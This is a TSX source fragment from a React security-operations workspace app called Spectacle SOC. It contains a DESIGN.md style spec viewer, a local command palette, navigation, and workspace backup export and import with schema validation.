const DM_SECTIONS:string[][]=[["Visual Theme & Atmosphere", "Mood, density, design philosophy"], ["Color Palette & Roles", "Semantic name + hex + functional role"], ["Typography Rules", "Font families, full hierarchy table"], ["Component Stylings", "Buttons, cards, inputs, nav with states"], ["Layout Principles", "Spacing scale, grid, whitespace"], ["Depth & Elevation", "Shadow system, surface hierarchy"], ["Do's and Don'ts", "Guardrails and anti-patterns"], ["Responsive Behavior", "Breakpoints, touch targets, collapsing"], ["Agent Prompt Guide", "Quick color reference, ready-to-use prompts"]];
const DM_SPEC=`# Spectacle DESIGN.md

## 1. Visual Theme & Atmosphere
Playful neo-brutalist on warm cream. Thick ink borders, hard offset shadows, bold type, high contrast. Friendly, never corporate. Dark mode swaps cream for deep violet.

## 2. Color Palette & Roles
| Role | Light | Dark |
|---|---|---|
| Background | #fff3d6 | #1b1526 |
| Card | #ffffff | #2a2038 |
| Text / ink | #1a1a1a | #f6f0ff |
| Muted text | #5d5a52 | #b5aac9 |
| Primary action (pink) | #ff3d7f | #ff3d7f |
| Highlight (yellow) | #ffd23f | #ffd23f |
| Success accent (teal) | #12b89a | #12b89a |
| Warning accent (orange) | #ff8a1f | #ff8a1f |
| Success wash | #d9f6ec | #12382f |
| Warning wash | #ffe3cc | #443019 |

## 3. Typography Rules
- Family: Outfit (300/400/600) with system-ui fallback.
- H1: clamp(30px, 7vw, 52px), line-height 1.05, letter-spacing -1.5px.
- H2: 20px. H3: 15px. Body: 15px/1.5. Secondary: 13px, muted.
- Inputs are 16px on phones so iOS never zooms.

## 4. Component Stylings
- Card: 2.5px ink border, 14px radius, 4px 4px 0 ink shadow, 12px padding.
- Button: pill, 2px ink border, bold. Primary is pink with light text. Press scales to .97.
- Chips and pills: 1.5px border, filled ink when selected.
- Nav: sliding indicator under the active item; bottom bar under 720px.

## 5. Layout Principles
- Max width 960px, 16px gutters, 12px base gap.
- Cards in auto-fit grids, minmax(220px, 1fr).
- Long text must wrap; no horizontal page scroll at 390px.

## 6. Depth & Elevation
Depth comes from hard offset shadows, not blur. Nested cards drop the shadow. No glassmorphism.

## 7. Do's and Don'ts
- Do use one accent per view. Do keep borders thick and consistent.
- Do animate only transform and opacity, under 300ms, ease-out (cubic-bezier(.23,1,.32,1)).
- Don't use ease-in. Don't scale in from 0. Don't lift non-clickable cards on hover.
- Don't add hover effects outside (hover:hover) and (pointer:fine).
- Don't hide meaning in color alone.

## 8. Responsive Behavior
- Breakpoint 720px: top nav becomes a bottom bar with safe-area padding.
- Touch targets at least 40px. touch-action: manipulation on controls.
- Use dvh, not vh, for viewport-height boxes.
- prefers-reduced-motion: keep fades, drop movement.

## 9. Agent Prompt Guide
Quick colors: bg #fff3d6, ink #1a1a1a, pink #ff3d7f, yellow #ffd23f, teal #12b89a.
Prompt: "Build this screen in the Spectacle style: cream background, 2.5px ink borders, hard offset shadows, pink primary pill button, Outfit font."
`;
function DesignMd(){const [cat,setCat]=useState('All');const [q,setQ]=useState('');const [m,setM]=useState('');
 const say=(x:string)=>{setM(x);setTimeout(()=>setM(''),1800)};
 const all:string[][]=[];Object.keys(DM_BRANDS).forEach(c=>DM_BRANDS[c].forEach((b:string[])=>all.push([b[0],b[1],c])));
 const list=all.filter(b=>(cat==='All'||b[2]===cat)&&(!q.trim()||(b[0]+' '+b[1]).toLowerCase().includes(q.trim().toLowerCase())));
 const dl=()=>{try{const u=URL.createObjectURL(new Blob([DM_SPEC],{type:'text/markdown'}));const a=document.createElement('a');a.href=u;a.download='DESIGN.md';document.body.appendChild(a);a.click();a.remove();setTimeout(()=>URL.revokeObjectURL(u),500);say('Downloaded')}catch(e){say('Use Copy instead')}};
 const use=(n:string)=>copyText('Use the '+n+' DESIGN.md from https://github.com/VoltAgent/awesome-design-md as the design language. Build me a page that looks like it.',x=>say(x==='Copied'?'Prompt for '+n+' copied':x));
 return <div><h2 className="tk-sec">DESIGN.md, in depth</h2>
 <p className="s">A plain markdown file your agent reads to keep UI consistent. AGENTS.md says how to build; DESIGN.md says how it should look and feel. Introduced by Google Stitch.</p>
 <div className="tk-grid">{DM_SECTIONS.map((x,i)=><div className="card" key={x[0]}><span className="tk-tag">{i+1}</span><h3 style={{margin:0}}>{x[0]}</h3><p className="s" style={{margin:0}}>{x[1]}</p></div>)}</div>
 <div className="card"><h2>Spectacle's own DESIGN.md</h2><p className="s">Written from this app's real tokens. Drop it in a project root so an agent can build screens that match.</p>
 <button className="b pk" onClick={dl}>Download DESIGN.md</button> <button className="b" onClick={()=>copyText(DM_SPEC,say)}>Copy</button> <span className="s" role="status" aria-live="polite">{m}</span>
 <details><summary>Preview</summary><pre style={{fontSize:12}}>{DM_SPEC}</pre></details></div>
 <h2 className="tk-sec">Brand design languages ({all.length})</h2>
 <p className="s">A sample of the collection in awesome-design-md. Pick one, copy the prompt, paste it into your agent. Brand names belong to their owners; these are style references, not endorsements.</p>
 <input aria-label="Filter brands" placeholder="Filter, e.g. dark, green, serif" value={q} onChange={(e:any)=>setQ(e.target.value)} style={{width:'100%',padding:'8px 12px',borderRadius:12,border:'2px solid var(--ink)',background:'var(--card)',marginBottom:8}}/>
 <div style={{display:'flex',gap:6,flexWrap:'wrap',marginBottom:12}}>{['All',...Object.keys(DM_BRANDS)].map(c=><button key={c} className={'chip '+(cat===c?'on':'')} onClick={()=>setCat(c)}>{c}</button>)}</div>
 {list.length?<div className="tk-grid">{list.map(b=><div className="card" key={b[0]}><span className="tk-tag">{b[2]}</span><h3 style={{margin:0}}>{b[0]}</h3><p className="s" style={{margin:0}}>{b[1]}</p><button className="b" onClick={()=>use(b[0])}>Copy agent prompt</button></div>)}</div>:<p className="s">No match. Try a shorter word.</p>}
 <p className="s" style={{marginTop:12}}>The full set, with preview pages and dark previews, is at <a href="https://github.com/VoltAgent/awesome-design-md" target="_blank" rel="noopener noreferrer">github.com/VoltAgent/awesome-design-md</a>.</p></div>}


// Command center: search only the local, already-loaded workspace. No background network calls.
function CommandCenter({open,close,go,s,lib,selectPb,selectRun,selectEvent,exportWorkspace,openImport,focus,toggleFocus}:any){
 const [query,setQuery]=useState('');const [at,setAt]=useState(0);const field=useRef<HTMLInputElement>(null);
 useEffect(()=>{if(open){setQuery('');setAt(0);const id=requestAnimationFrame(()=>field.current&&field.current.focus());return()=>cancelAnimationFrame(id)}},[open]);
 const items:any[]=[
  ...NAV.map((x:string[])=>({id:'page-'+x[0],group:'Pages',title:x[2],hint:'Open '+x[2],terms:x[0]+' '+x[2],go:()=>go(x[0])})),
  ...s.findings.filter((f:Finding)=>f.t.trim()).slice(0,80).map((f:Finding,i:number)=>({id:'finding-'+i,group:'Findings',title:f.t,hint:f.th+' · severity '+f.s+'/5',terms:f.t+' '+f.th+' '+f.a.join(' '),go:()=>{go('case');setTimeout(()=>document.getElementById('sec-findings')?.scrollIntoView({behavior:'smooth'}),100)}})),
  ...(s.timeline||[]).slice(-80).map((e:TimelineEvent)=>({id:'trace-'+e.id,group:'Timeline',title:e.summary,hint:(e.asset?e.asset+' · ':'')+showStamp(e.at),terms:e.summary+' '+e.asset+' '+e.actor+' '+e.source+' '+e.at,go:()=>selectEvent(e.id)})),
  ...lib.pbs.map((p:PB)=>({id:'pb-'+p.id,group:'Playbooks',title:p.name,hint:'Version '+p.v,terms:p.name+' '+p.kind+' '+p.id,go:()=>selectPb(p.id)})),
  ...lib.runs.slice(-30).reverse().map((r:Run)=>({id:'run-'+r.id,group:'Runs',title:r.pbName,hint:'Run · '+(r.done?(r.verdict||'done'):'active')+' · version '+r.v,terms:r.id+' '+r.pbName+' '+r.verdict,go:()=>selectRun(r.id)})),
  {id:'export-workspace',group:'Actions',title:'Export workspace backup',hint:'Download a JSON copy of cases, playbooks and runs',terms:'backup save download export JSON',go:exportWorkspace},
  {id:'import-workspace',group:'Actions',title:'Restore workspace backup',hint:'Choose a Spectacle SOC JSON backup',terms:'import restore upload backup JSON',go:openImport},
  {id:'focus',group:'Actions',title:focus?'Exit focus mode':'Enter focus mode',hint:'Hide navigation for a distraction-free view',terms:'focus zen immersive',go:toggleFocus}
 ];
 const q=query.trim().toLowerCase();const hits=items.filter((x:any)=>!q||(x.title+' '+x.hint+' '+x.terms).toLowerCase().includes(q)).slice(0,16);
 useEffect(()=>setAt(0),[query]);
 if(!open)return null;
 const pick=(x:any)=>{if(!x)return;close();x.go()};
 return <div className="command-backdrop" onMouseDown={(e:any)=>{if(e.target===e.currentTarget)close()}}>
  <section className="command-dialog" role="dialog" aria-modal="true" aria-label="Search and commands">
   <div className="command-search"><span aria-hidden="true">⌕</span><input ref={field} aria-label="Search pages, findings, playbooks and runs" placeholder="Where do you want to go?" value={query} onChange={(e:any)=>setQuery(e.target.value)} onKeyDown={(e:any)=>{if(e.key==='ArrowDown'){e.preventDefault();setAt((n:number)=>Math.min(n+1,hits.length-1))}if(e.key==='ArrowUp'){e.preventDefault();setAt((n:number)=>Math.max(0,n-1))}if(e.key==='Enter'){e.preventDefault();pick(hits[at])}if(e.key==='Escape'){e.preventDefault();close()}if(e.key==='Tab'){e.preventDefault();if(e.shiftKey){setAt((n:number)=>Math.max(0,n-1))}else{setAt((n:number)=>Math.min(hits.length-1,n+1))}}}}/><button aria-label="Close command center" className="command-close" onClick={close}>ESC</button></div>
   <div className="command-results" role="listbox" aria-label="Search results">
    {hits.length?hits.map((x:any,i:number)=><button role="option" aria-selected={i===at} className={'command-option '+(i===at?'selected':'')} key={x.id} onMouseEnter={()=>setAt(i)} onClick={()=>pick(x)}><span className="command-symbol">{x.group==='Findings'?'!':x.group==='Playbooks'?'▤':x.group==='Runs'?'▶':x.group==='Actions'?'✦':'⌘'}</span><span className="command-label"><strong>{x.title}</strong><small>{x.hint}</small></span><span className="command-group">{x.group}</span></button>):<div className="command-empty">Nothing found in this workspace. Try a shorter term.</div>}
   </div>
   <footer className="command-footer"><span>↑ ↓ to move · enter to select · esc to close</span><span>Local results only · not a live SIEM</span></footer>
  </section></div>
}

function Nav({pg,go,cls}:any){const r=useRef<any>(null);const [b,setB]=useState<any>({l:0,w:0});
const measure=()=>{const el=r.current&&r.current.querySelector('.nb.on');if(el)setB({l:el.offsetLeft,w:el.offsetWidth})};
React.useLayoutEffect(()=>{measure()},[pg]);
useEffect(()=>{window.addEventListener('resize',measure);return()=>window.removeEventListener('resize',measure)},[]);
return <nav className={cls} ref={r}>{NAV.map((x:any)=><button key={x[0]} className={'nb '+(pg===x[0]?'on':'')} onClick={()=>go(x[0])}><i>{x[1]}</i>{x[2]}</button>)}<span className="ind" style={{transform:'translateX('+b.l+'px)',width:b.w}} aria-hidden="true"/></nav>}

function App(){const [s,up]=useSt();const [lib,upLib]=useLib();const [th,setTh]=useTheme();const auth=useAuth();const cloud=useCloud(s,up,auth);const libCloud=useCloud(lib,upLib,auth,{key:'soc-libcloud',kind:'soc-library',name:LIBNAME});
const sx:any={...s,pbs:lib.pbs,runs:lib.runs,twoPerson:lib.set.twoPerson};const upx=(p:any)=>{const lp:any={},cp:any={};Object.keys(p).forEach((k:string)=>{if(k==='pbs'||k==='runs')lp[k]=p[k];else if(k==='twoPerson')lp.set={...lib.set,twoPerson:p[k]};else cp[k]=p[k]});if(Object.keys(lp).length)upLib(lp);if(Object.keys(cp).length)up(cp)};const [pg,setPg]=useState('home');const [open,setOpen]=useState(false);const [dir,setDir]=useState(1);const [cmdOpen,setCmdOpen]=useState(false);const [focus,setFocus]=useState(false);const [targetPb,setTargetPb]=useState('');const [targetRun,setTargetRun]=useState('');const [targetEvent,setTargetEvent]=useState('');const [notice,setNotice]=useState('');const importRef=useRef<HTMLInputElement>(null);
  useEffect(()=>{const onKey=(e:KeyboardEvent)=>{const target=e.target as HTMLElement;const typing=!!(target&&((target.tagName==='INPUT')||(target.tagName==='TEXTAREA')||(target.tagName==='SELECT')||target.isContentEditable));
   if((e.metaKey||e.ctrlKey)&&e.key.toLowerCase()==='k'){e.preventDefault();setCmdOpen(v=>!v)}
   else if(e.key==='/'&&!typing&&!e.metaKey&&!e.ctrlKey&&!e.altKey){e.preventDefault();setCmdOpen(true)}
   else if(e.key==='Escape'){setCmdOpen(false);setFocus(false);setOpen(false)}
  };window.addEventListener('keydown',onKey);return()=>window.removeEventListener('keydown',onKey)},[]);
  useEffect(()=>{if(!notice)return;const t=setTimeout(()=>setNotice(''),4800);return()=>clearTimeout(t)},[notice]);
  const exportWorkspace=()=>{const stamp=new Date().toISOString().slice(0,10);const payload={format:'spectacle-soc-workspace',version:1,exportedAt:new Date().toISOString(),case:s,library:lib,theme:th};downloadBlob(new Blob([JSON.stringify(payload,null,2)],{type:'application/json'}),'spectacle-soc-backup-'+stamp+'.json');setNotice('Backup downloaded. Store it securely; it may contain sensitive evidence.');};
  const importWorkspace=async(file:File)=>{if(file.size>5*1024*1024){setNotice('Backup too large (5 MB limit).');return}try{const v=JSON.parse(await file.text());const c=v.case,l=v.library;
   const isObj=(x:any)=>x&&typeof x==='object'&&!Array.isArray(x);
   const fields=['assets','findings','evidence','actions','notes','chat','hist'];const strings=['name','cat','goal','problem','why','whynow'];
   if(v.format!=='spectacle-soc-workspace'||v.version!==1||!isObj(c)||!isObj(l)||!fields.every(k=>Array.isArray(c[k]))||!strings.every(k=>typeof c[k]==='string')||!Number.isInteger(c.ci)||c.ci<0||c.ci>Q.length||!Array.isArray(l.pbs)||!Array.isArray(l.runs)||!isObj(l.set)||(c.timeline!==undefined&&(!Array.isArray(c.timeline)||c.timeline.length>1000||!c.timeline.every((x:any)=>isObj(x)&&typeof x.id==='string'&&typeof x.at==='string'&&typeof x.kind==='string'&&typeof x.summary==='string'&&typeof x.source==='string'&&typeof x.asset==='string'&&typeof x.actor==='string'&&typeof x.note==='string'&&typeof x.raw==='string')))||
    !c.assets.every((x:any)=>typeof x==='string')||!c.findings.every((x:any)=>isObj(x)&&typeof x.t==='string'&&Array.isArray(x.a)&&typeof x.c==='string'&&typeof x.th==='string'&&x.a.every((a:any)=>typeof a==='string')&&typeof x.s==='number')||
    !c.evidence.every((x:any)=>isObj(x)&&typeof x.t==='string'&&typeof x.k==='string'&&typeof x.g==='string')||!c.actions.every((x:any)=>isObj(x)&&typeof x.t==='string'&&typeof x.b==='string')||
    !c.notes.every((x:any)=>isObj(x)&&typeof x.t==='string'&&Array.isArray(x.cm)&&x.cm.every((y:any)=>typeof y==='string'))||!c.chat.every((x:any)=>isObj(x)&&typeof x.t==='string')||
    !l.pbs.every((x:any)=>isObj(x)&&typeof x.id==='string'&&typeof x.name==='string'&&typeof x.body==='string'&&typeof x.v==='number'&&Array.isArray(x.log))||!l.runs.every((x:any)=>isObj(x)&&typeof x.id==='string'&&typeof x.pbName==='string'&&Array.isArray(x.steps)&&x.steps.every((st:any)=>isObj(st)&&typeof st.t==='string'&&typeof st.st==='string')))throw Error('This is not a valid Spectacle SOC workspace backup.');
   if(!window.confirm('Replace the current case, playbooks and runs with this backup? This cannot be undone. If the workspace is linked to cloud sync, imported changes may sync to the cloud.'))return;
   const safe:any={...caseBlank()};Object.keys(safe).forEach(k=>{if(k!=='kind'&&Object.prototype.hasOwnProperty.call(c,k))safe[k]=c[k]});safe.kind='soc-case';
   up(safe);upLib({kind:'soc-library',pbs:l.pbs,runs:l.runs,set:{twoPerson:!!l.set.twoPerson}});
   if(isObj(v.theme)&&['system','light','dark'].includes(v.theme.mode))setTh({id:String(v.theme.id||'graphite'),mode:v.theme.mode,custom:String(v.theme.custom||'')});
   setNotice('Backup restored. Verify the case and playbook versions.');setPg('dash');window.scrollTo(0,0);
  }catch(e:any){setNotice(e&&e.message?e.message:'Could not read backup file.')}};
  useEffect(()=>{const els=Array.from(document.querySelectorAll('main .card,main .idx,main .phone,main .kpi,main .hot,main .prow,main .qrow')) as HTMLElement[];
    els.forEach(el=>el.setAttribute('data-reveal',''));
    const IO=(window as any).IntersectionObserver;
    const io=IO?new IO((ents:any[])=>{ents.forEach((en:any)=>{if(en.isIntersecting){en.target.classList.add('in');io.unobserve(en.target)}})},{rootMargin:'0px 0px -6% 0px',threshold:0.01}):null;
    els.forEach(el=>{if(io)io.observe(el);else el.classList.add('in')});
    return()=>{if(io)io.disconnect()}},[pg]);
  useEffect(()=>{const f=()=>{const h=document.documentElement;const max=h.scrollHeight-h.clientHeight;h.style.setProperty('--scroll',String(max>0?window.scrollY/max:0))};window.addEventListener('scroll',f,{passive:true});f();return()=>window.removeEventListener('scroll',f)},[pg]);const go=(p:string)=>{const a=NAV.findIndex((x:any)=>x[0]===pg),b=NAV.findIndex((x:any)=>x[0]===p);setDir(b>=a?1:-1);setPg(p);window.scrollTo(0,0)};
const pages:any={home:()=><SOCCommandDashboard go={go} s={sx} auth={auth} openSearch={()=>setCmdOpen(true)}/>,case:()=><Case s={sx} up={upx} go={go}/>,timeline:()=><Timeline s={sx} up={upx} go={go} targetEvent={targetEvent}/>,triage:()=><Matrix s={sx} up={upx} go={go}/>,playbooks:()=><Playbooks s={sx} up={upx} auth={auth} lc={libCloud} targetPb={targetPb} go={go}/>,hunt:()=><Hunt s={s} up={up} lib={lib} upLib={upLib} go={go}/>,runs:()=><Runs s={sx} up={upx} go={go} auth={auth} targetRun={targetRun}/>,threats:()=><SOCThreatIntel s={sx} up={upx} go={go} openEvent={(id:string)=>{setTargetEvent(id);go('timeline')}}/>,dash:()=><><SOCReportAudit s={sx} go={go}/><Dash s={sx} up={upx} go={go} auth={auth} cloud={cloud}/></>,toolkit:()=><Toolkit s={s}/>,models:()=><SOCModelLab go={go}/>,network:()=><SOCNetworkLab auth={auth} go={go}/>,theme:()=><ThemePage th={th} setTh={setTh}/>,faq:()=><SOCGuidePage s={sx} go={go}/>};
const selectEvent=(id:string)=>{setTargetEvent(id);go('timeline')};const selectPb=(id:string)=>{setTargetPb(id);go('playbooks')};const selectRun=(id:string)=>{setTargetRun(id);go('runs')};
const nb=(x:string[])=><button key={x[0]} className={'nb '+(pg===x[0]?'on':'')} onClick={()=>go(x[0])}><i>{x[1]}</i>{x[2]}</button>;
return <><SOCShell pg={pg} go={go} focus={focus} toggleFocus={()=>setFocus(v=>!v)} openSearch={()=>setCmdOpen(true)}>{pages[pg]()}</SOCShell><input ref={importRef} type="file" accept=".json,application/json" style={{display:'none'}} aria-label="Restore workspace JSON backup" onChange={(e:any)=>{const f=e.target.files?.[0];if(f)importWorkspace(f);e.target.value=''}}/><CommandCenter open={cmdOpen} close={()=>setCmdOpen(false)} go={go} s={sx} lib={lib} selectPb={selectPb} selectRun={selectRun} selectEvent={selectEvent} exportWorkspace={exportWorkspace} openImport={()=>importRef.current?.click()} focus={focus} toggleFocus={()=>setFocus(v=>!v)}/>{notice&&<div className="soc-toast" role="status" aria-live="polite"><span>{notice}</span><button onClick={()=>setNotice('')} aria-label="Dismiss notification">×</button></div>}</>}
ReactDOM.createRoot(document.getElementById('root')!).render(<App/>);
